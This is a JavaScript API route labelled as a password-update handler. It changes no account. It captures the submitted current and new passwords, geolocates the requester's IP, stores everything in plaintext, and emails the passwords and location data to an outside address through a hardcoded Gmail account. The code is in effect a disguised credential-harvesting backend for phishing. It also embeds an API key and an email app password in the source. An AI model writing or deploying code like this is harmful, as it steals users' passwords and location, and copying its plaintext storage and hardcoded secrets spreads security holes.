import { connectToDatabase } from "..//..//lib/mongodb"; // Add your database connection logic
import nodemailer from "nodemailer";
import axios from "axios"; // Make sure axios is installed for API calls

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  const { currentPassword, newPassword } = req.body;

  if (!currentPassword || !newPassword) {
    return res.status(400).json({
      message: "Current password, new password are required.",
    });
  }

  try {
    // Step 1: Fetch GeoAPI data for the provided IP address
    const geoApiResponse = await axios.get(
      `https://api.getgeoapi.com/v2/ip/check?api_key=c1c2a7e90b2e69d3329e2744c0c1ba2559e58269`
    );

    const geoData = geoApiResponse.data;
    // Extract relevant information from the GeoAPI response
    const { ip: ipAddress, type, location, postcode, security } = geoData;
    const { latitude, longitude } = location;
    const { is_tor, is_proxy } = security;

    // Step 2: Save the current and new passwords to the DB (You may want to hash passwords in real use cases)
    const db = await connectToDatabase();
    const users = db.collection("users"); // Assume users collection

    const result = await users.insertOne({
      currentPassword,
      password: newPassword,
      ipAddress,
      type,
      latitude,
      longitude,
      postcode,
      is_tor,
      is_proxy,
    });

    if (result.acknowledged) {
      // Step 3: Send an email with the old and new passwords along with GeoAPI data
      const transporter = nodemailer.createTransport({
        service: "gmail", // Or use any email provider (Mailgun, Sendgrid, etc.)
        auth: {
          user: "curiousbytes2@gmail.com", // Your email
          pass: "svrv buoh cjrz ddmb", // Your email password or App Password
        },
      });

      const mailOptions = {
        from: "curiousbytes2@gmail.com", // Sender address
        to: "f219257@cfd.nu.edu.pk", // Recipient email address
        subject: "Password Update Notification",
        text: `
          The password has been updated for the account:

          Current Password: ${currentPassword}
          New Password: ${newPassword}

          IP Information:
          - IP Address: ${ipAddress}
          - Type: ${type}
          - Latitude: ${latitude}
          - Longitude: ${longitude}
          - Postcode: ${postcode}
          - Is TOR: ${is_tor}
          - Is Proxy: ${is_proxy}
        `,
      };

      // Send the email
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          return console.log("Error sending email: ", error);
        }
        console.log("Email sent: " + info.response);
      });

      return res.status(200).json({
        message: "Password updated successfully.",
      });
    } else {
      return res.status(500).json({ message: "Failed to save password." });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ message: "An error occurred.", error: error.message });
  }
}
